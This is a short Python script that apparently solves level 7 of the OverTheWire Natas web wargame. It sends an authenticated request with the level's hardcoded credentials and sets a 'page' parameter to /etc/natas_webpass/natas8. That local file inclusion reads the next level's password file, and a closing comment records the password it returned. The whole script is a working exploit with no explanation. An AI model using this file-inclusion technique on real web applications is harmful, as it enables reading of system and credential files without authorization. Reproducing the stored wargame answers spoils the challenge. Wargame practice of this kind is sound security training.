import requests,re


username="natas7"
password="7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

url=str("http://%s.natas.labs.overthewire.org?page=/etc/natas_webpass/natas8" %username)

r=requests.post(url,auth=(username,password))
print(r.text)
#DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe